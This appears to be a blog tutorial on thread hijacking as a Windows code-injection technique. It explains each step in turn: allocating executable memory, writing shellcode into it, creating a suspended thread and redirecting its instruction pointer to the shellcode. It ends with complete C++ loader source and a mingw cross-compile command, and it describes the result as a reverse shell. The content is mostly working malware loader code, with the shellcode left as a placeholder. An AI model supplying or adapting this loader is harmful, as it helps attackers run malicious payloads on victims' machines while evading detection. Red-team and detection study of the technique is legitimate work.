## Practical Thread Hijacking - From Theory to Malware Code

One code injection technique that often appears in malware development is thread hijacking. In summary: Thread Hijacking is a technique in which an attacker takes over the execution of a thread that is already running in the target process (or its own process), then uses it to execute code created by the attacker. This technique is often used because it allows the execution of malicious code without having to create a new thread that is easily detected.

1. Dummy Function Preparation
```
void dummy() {
    // Fungsi dummy yang tidak melakukan apa-apa
    // Hanya sebagai "placeholder" untuk thread
}
```

The attacker creates a simple dummy function that acts as a fake Thread creation function.

---
2. Executable Memory Allocation
```
auto hMemory = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
```

Allocate memory with PAGE_EXECUTE_READWRITE permission, so this memory will become a “container” for shellcode. This permission allows execution, reading, and writing.

---
3. Writing Shellcode to Memory
```
WriteProcessMemory(GetCurrentProcess(), hMemory, shellcode, sizeof(shellcode), &bytesWritten);
```
Write shellcode to memory that has been allocated beforehand. In this case, because we are using a self-process, we can use the GetCurrentProcess() function.

---

4. Creation of Suspended Threads
```
auto hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)&dummy, NULL, CREATE_SUSPENDED, &threadId);
```

Creating a thread in SUSPENDED state, the thread should execute a dummy function because we use the CREATE_SUSPENDED flag, so the thread does not run immediately.

---
5. Thread Context Manipulation
```
CONTEXT ctx = { 0 };
ctx.ContextFlags = CONTEXT_ALL;
GetThreadContext(hThread, &ctx);

// Hijacking is happening here!
ctx.Rip = (DWORD64)hMemory;
SetThreadContext(hThread, &ctx);
```

GetThreadContext() retrieves the execution state of the thread, then ctx.Rip or Instruction Pointer determines the next execution address. The attacker changes RIP from the `dummy` address to the address of `hMemory`.

---

6. Shellcode Execution
```
ResumeThread(hThread);
WaitForSingleObject(hThread, INFINITE);
```

The thread is remused and immediately executes the shellcode. And BOOM, we get a Reverse Shell.

![alt text](https://cdn-images-1.medium.com/max/800/1*TURwikis-EbXPa1cVFVLpA.png)


### Full Source Code

```
#include <windows.h>

void dummy() {
    // do nothing
}

int main()
{
    unsigned char shellcode[] = // shellcode;

    // allocate a region of memory
    auto hMemory = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    // write the shellcode into memory
    SIZE_T bytesWritten = 0;
    WriteProcessMemory(GetCurrentProcess(), hMemory, shellcode, sizeof(shellcode), &bytesWritten);

    // create a suspended thread pointing at a dummy function
    DWORD threadId = 0;
    auto hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)&dummy, NULL, CREATE_SUSPENDED, &threadId);

    // little sleep
    Sleep(5 * 1000);

    // get current thread's context
    CONTEXT ctx = { 0 };
    ctx.ContextFlags = CONTEXT_ALL;

    GetThreadContext(hThread, &ctx);

    // point thread context at shellcode
    ctx.Rip = (DWORD64)hMemory;
    SetThreadContext(hThread, &ctx);

    // resume the thread
    ResumeThread(hThread);

    // wait on thread
    WaitForSingleObject(hThread, INFINITE);

    // close handle
    CloseHandle(hThread);
}

```

Compile using x86_64-w64-mingw32-g++ if you want to cross-compile using Linux.
```
x86_64-w64-mingw32-g++ -o TH.exe main.cpp -lws2_32 -ladvapi32 -static
```

![alt text](https://cdn-images-1.medium.com/max/800/1*rQsIdlpPXVDd1d-1cuC_pg.png)

### Conclusion
Thread Hijacking is an advanced technique in the red team operations arsenal that is effective for bypassing security controls. A deep understanding of this technique is important for both offensive security testing and defensive detection development.
